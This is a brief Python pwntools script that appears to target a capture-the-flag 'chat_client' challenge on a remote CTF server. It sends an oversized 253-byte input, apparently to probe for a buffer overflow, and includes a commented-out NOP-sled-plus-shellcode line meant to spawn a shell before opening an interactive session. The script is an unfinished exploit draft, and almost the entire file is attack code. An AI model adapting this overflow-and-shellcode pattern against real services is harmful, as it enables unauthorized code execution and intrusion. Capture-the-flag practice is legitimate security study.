#!/usr/bin/python

from pwn import *
import time

context.arch="amd64"

#s = process("./chat_client")
s = remote("rcs.eatpwnnosleep.com",13137)

s.recvuntil(">>")
s.sendline("1")
s.recvuntil(">>")
s.sendline("A"*253)
s.recvuntil("wait 10 seconds...")

pause()

s.recvuntil("==========Chat Start==========\n")
time.sleep(1)

print s.recv(4096)

s.sendline("/bye\n")

#s.send("\x90"*50+asm(shellcraft.sh()))

s.interactive()
